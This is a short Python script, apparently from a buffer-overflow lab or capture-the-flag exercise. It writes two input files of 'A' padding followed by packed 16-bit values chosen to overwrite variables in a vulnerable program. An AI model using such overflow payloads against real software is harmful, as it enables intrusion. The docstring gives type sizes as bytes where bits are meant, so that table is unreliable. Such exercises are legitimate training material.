#!/usr/bin/env python3

import struct

pad = 0x30 - 0x6
target_1 = struct.pack("<h", 31337)
target_2_a = struct.pack("<h", -31337)
target_2_b = struct.pack("<H", 0x8597)

"""
@: native order, size & alignment (default)
=: native order, std. size & alignment
<: little-endian, std. size & alignment
>: big-endian, std. size & alignment
!: same as >

h: short (16 bytes)
H: unsigned short (16 bytes)
i: int (32 bytes)
I: unsigned int (32 bytes)
q: long long (64 bytes)
Q: unsigned long long (64 bytes)
"""

inp = b"A" * pad + target_1 + target_2_a + b"\n"

with open("input-1", "wb") as f:
    f.write(inp)

inp = b"A" * pad + target_1 + target_2_b + b"\n"

with open("input-2", "wb") as f:
    f.write(inp)
